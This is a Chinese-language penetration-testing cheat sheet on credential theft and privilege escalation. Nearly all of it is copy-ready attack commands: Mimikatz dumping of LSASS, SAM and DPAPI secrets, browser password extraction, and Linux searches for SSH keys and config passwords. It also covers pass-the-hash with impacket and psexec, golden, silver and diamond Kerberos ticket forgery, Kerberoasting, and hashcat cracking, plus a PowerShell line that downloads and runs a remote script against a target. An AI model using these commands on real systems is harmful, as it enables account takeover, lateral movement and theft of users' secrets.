---
id: 04-004
title: "🔑 凭证窃取与利用 (Credential Theft & Exploitation)"
category: 权限提升
category_en: "Privilege Escalation"
difficulty: ★★★★
tools: "Mimikatz, Lazagne, LaZagne, ProcDump"
last_updated: 2025-07
tags: ["privilege-escalation", "linux-privilege", "windows-privilege", "credential-theft"]
subdomain: privilege-escalation
nist_csf: ["PR.AC-01", "DE.CM-04"]
mitre_attack: ["T1068", "T1548", "T1055", "T1003"]
---
# 🔑 凭证窃取与利用 (Credential Theft & Exploitation)

## 概述
窃取系统存储的密码、哈希、令牌等凭证信息，用于权限提升、横向移动和持久化控制。

## 核心技能

### 1. Windows凭证窃取

```powershell
# Mimikatz - 从LSASS提取凭证
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "exit"
mimikatz.exe "privilege::debug" "sekurlsa::kerberos" "exit"
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
mimikatz.exe "privilege::debug" "privilege::debug" "sekurlsa::ekeys" "exit"

# 使用Procdump+离线Mimikatz
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
# 传输到本地后
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"

# 使用内置工具（Windows Defender环境）
# 使用Task Manager手动转储LSASS
# 打开任务管理器 -> 详细信息 -> lsass.exe -> 创建转储文件

# SAM文件
reg save hklm\sam sam.save
reg save hklm\system system.save
reg save hklm\security security.save
# 然后使用impacket-secretsdump提取
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL

# DPAPI凭证
# 主密码文件位置: %APPDATA%\Microsoft\Protect\{SID}\
# 使用Mimikatz
mimikatz.exe "dpapi::masterkey /in:C:\Users\user\AppData\Roaming\Microsoft\Protect\SID\GUID /rpc" exit
mimikatz.exe "dpapi::cred /in:C:\Users\user\AppData\Roaming\Microsoft\Credentials\FILE" exit

# 浏览器密码
# Chrome
dir "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"
# 使用ChromePass或SharpChrome
SharpChrome.exe logins

# Windows凭据管理器
cmdkey /list
# 保存的RDP/网络凭证
dir C:\Users\%USERNAME%\AppData\Local\Microsoft\Credentials
mimikatz.exe "dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\*" exit
```

### 2. Linux凭证窃取

```bash
# 内存中的密码
# 检查bash历史
cat ~/.bash_history
cat ~/.zsh_history
history | grep -E "pass|ssh|mysql|password|secret"

# 配置文件中的密码
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
grep -r "password" /home/ 2>/dev/null

# SSH密钥
find /home -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys" 2>/dev/null
find /home -name ".ssh" -type d 2>/dev/null

# 数据库凭证
find /var/www -name "*.php" -exec grep -l "mysql_connect\|mysqli_connect\|PDO" {} \; 2>/dev/null
grep -r "DB_HOST\|DB_USER\|DB_PASS\|DB_NAME" /var/www/*/config* 2>/dev/null

# 从进程内存中提取
# 使用mimipenguin（需要root）
git clone https://github.com/huntergregal/mimipenguin.git
cd mimipenguin
python3 mimipenguin.py

# 使用LaZagne
python2.7 laZagne.py all

# sudo缓存
sudo -k  # 清除缓存
sudo -l 2>/dev/null | grep -i "nopasswd\|NOPASSWD"

# 失败的ssh登录尝试
lastb
```

### 3. 网络服务凭证

```bash
# FTP凭证
grep -r "ftp_user\|ftp_pass\|FTP_USER\|FTP_PASSWORD" ./

# MySQL凭证
grep -r "mysql://\|mysql_user\|mysql_password\|MYSQL_ROOT" ./
cat ~/.my.cnf 2>/dev/null
cat /etc/mysql/debian.cnf 2>/dev/null

# 邮件凭证
grep -r "smtp_user\|smtp_pass\|SMTP_USER\|SMTP_PASSWORD" ./
grep -r "imap://\|smtp://\|pop3://" ./

# HTTP基本认证
grep -r "https?://.*:.*@" ./

# API密钥
grep -r "api_key\|api_secret\|API_KEY\|apikey" ./
grep -r "sk-[a-zA-Z0-9]" ./  # OpenAI API Key模式
```

### 4. 哈希传递 (Pass-The-Hash)

```bash
# 使用Mimikatz PTH
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:NTLM_HASH /run:powershell.exe"

# 使用impacket
# SMBExec
impacket-smbexec DOMAIN/Administrator@10.0.0.1 -hashes :NTLM_HASH

# WMIExec
impacket-wmiexec DOMAIN/Administrator@10.0.0.1 -hashes :NTLM_HASH

# PsExec
impacket-psexec DOMAIN/Administrator@10.0.0.1 -hashes :NTLM_HASH

# 使用PsExec
psexec.exe \\10.0.0.1 -u DOMAIN\Administrator -p NTLM_HASH cmd.exe

# 使用Invoke-TheHash
powershell -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1'); Invoke-WMIExec -Target 10.0.0.1 -Username Administrator -Hash NTLM_HASH"
```

### 5. Kerberos票据利用

```powershell
# Mimikatz Kerberos操作
# 提取所有票据
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit

# 黄金票据 (Golden Ticket) - 伪造KRBTGT
mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt" exit
mimikatz.exe "kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /id:500 /ptt" exit

# 白银票据 (Silver Ticket) - 伪造服务票据
mimikatz.exe "kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-... /target:SERVER.DOMAIN /service:HOST /rc4:SERVICE_HASH /id:500 /ptt" exit

# 钻石票据 (Diamond Ticket) 和 蓝宝石票据 (Sapphire Ticket)
# 使用Rubeus
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:KRBTGT_AES256 /nowrap

# 票据传递 (Pass-The-Ticket)
# 导出票证
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
# 注入票证
mimikatz.exe "kerberos::ptt C:\tickets\user@domain.kirbi" exit

# Rubeus
# 请求TGT
Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /ptt
# 请求服务票据
Rubeus.exe s4u /user:user /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:HOST/SERVER.DOMAIN /ptt
# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt
# AS-REP Roasting
Rubeus.exe asreproast /outfile:asrep_hashes.txt
```

### 6. 浏览器凭证提取

```bash
# Windows Chrome/Edge
# 使用SharpChrome
SharpChrome.exe logins /target:Chrome
SharpChrome.exe logins /target:Edge

# 使用BrowserGather
BrowserGather.exe

# 手动解密Chrome密码（Python）
python3 << 'EOF'
import os, json, base64, sqlite3
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Chrome密码路径
chrome_path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
# 或 Windows: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data

# 需要先提取本地加密密钥
# Linux: cat ~/.config/google-chrome/Local State | python3 -c "import sys,json; print(json.load(sys.stdin)['os_crypt']['encrypted_key'])"
# 然后使用解密脚本提取密码
EOF

# Firefox密码
# Firefox配置文件路径
ls ~/.mozilla/firefox/*.default-release/
# 使用firefox_decrypt
git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt
python3 firefox_decrypt.py ~/.mozilla/firefox/*.default-release/
```

### 7. 密码分析工具

```bash
# HashCat - GPU密码破解
# 识别哈希类型
hashid '$DCC2$10240#username#hash'

# NTLM破解
hashcat -m 1000 -a 0 hashes.txt rockyou.txt --potfile-path=ntlm.pot

# NetNTLMv2破解
hashcat -m 5600 -a 0 hashes.txt rockyou.txt

# Kerberos 5 TGS破解
hashcat -m 13100 -a 0 hashes.txt rockyou.txt

# AS-REP破解
hashcat -m 18200 -a 0 hashes.txt rockyou.txt

# bcrypt破解
hashcat -m 3200 -a 0 hashes.txt rockyou.txt

# 规则破解
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 掩码攻击
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?d?d?d?d

# John the Ripper
john --wordlist=rockyou.txt hashes.txt
john --show hashes.txt

# 使用规则
john --wordlist=rockyou.txt --rules=best64 hashes.txt
```

## 常用凭证收集位置

| 来源 | Windows路径/方法 | Linux路径/方法 |
|:---|:---|:---|
| 系统密码 | SAM文件、LSASS内存 | /etc/shadow |
| 浏览器 | Chrome/Edge/Firefox | .mozilla/firefox |
| 配置文件 | .ini, .config, .xml | .conf, .env, .ini |
| SSH密钥 | %USERPROFILE%\.ssh\ | ~/.ssh/ |
| 数据库 | 连接字符串 | my.cnf, .pgpass |
| 缓存凭证 | cmdkey /list | sudo -l |
| 文档 | 桌面文档、DOCs | ~/Desktop/*.txt |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Mimikatz | Windows凭证提取 | https://github.com/gentilkiwi/mimikatz |
| Rubeus | Kerberos攻击工具 | https://github.com/GhostPack/Rubeus |
| Impacket | 网络协议工具集 | https://github.com/fortra/impacket |
| LaZagne | 多平台密码提取 | https://github.com/AlessandroZ/LaZagne |
| HashCat | GPU密码破解 | https://hashcat.net/hashcat/ |
| John the Ripper | 密码破解 | https://www.openwall.com/john/ |
| SharpChrome | Chrome凭证提取 | https://github.com/GhostPack/SharpDPAPI |

## 参考资源
- [Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [ADSecurity - Kerberos Attacks](https://adsecurity.org/?p=556)
- [PayloadsAllTheThings - Credentials](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Credentials)
- [HackTricks - Credentials](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
